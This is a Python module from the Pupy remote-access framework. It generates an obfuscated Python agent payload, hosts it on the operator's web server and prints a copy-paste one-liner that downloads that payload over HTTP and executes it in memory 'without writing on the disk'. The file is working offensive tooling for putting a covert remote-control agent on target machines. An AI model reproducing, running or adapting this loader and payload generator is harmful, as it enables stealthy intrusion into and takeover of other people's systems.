#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import os.path
from io import open

from pupy.pupylib.PupyOutput import Success, Warn, Error, List
from pupy.pupylib.utils.obfuscate import compress_encode_obfs
from pupy.pupylib.payloads import dependencies
from pupy.pupylib import ROOT


def getLinuxImportedModules():
    lines = ''

    with open(os.path.join(ROOT, 'conf', 'imports_done.py')) as f:
        lines = f.read()

    return lines


def pack_py_payload(target, display, conf, autostart=True):
    display(Success('Generating PY payload ...'))

    stdlib = dependencies.importer(
        target, (
            'pyasn1', 'rsa', 'pyaes',
            'netaddr', 'tinyec', 'umsgpack',
            'poster', 'win_inet_pton', 'http_parser',
            'urllib_auth',
        ),
        ignore_native=True, as_dict=True
    )

    stdlib.update(
        dependencies.importer(
            target, (
                'pupy.network', 'pupy.agent'
            ), as_dict=True
        )
    )

    payload = dependencies.bootstrap(
        stdlib, conf, autostart
    ) + '\n'

    if target.debug:
        return payload

    return compress_encode_obfs(payload, main=True)


def serve_payload(display, server, payload, link_ip=None):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.web_handler_enabled:
        display(Error('Webserver disabled'))
        return

    landing_uri = server.serve_content(payload, alias='py payload')

    display(Warn('Python 2.7.x required, x should be >= 9'))

    if link_ip is None:
        link_ip = server.address

    display(List([
        "python -c 'import urllib;exec urllib.urlopen"
        "(\"http://%s:%s%s\").read()'" % (
            link_ip, server.web_handler_port, landing_uri
        ),
    ], caption=Success(
        'Copy/paste this one-line loader to deploy pupy '
        'without writing on the disk')
    ))
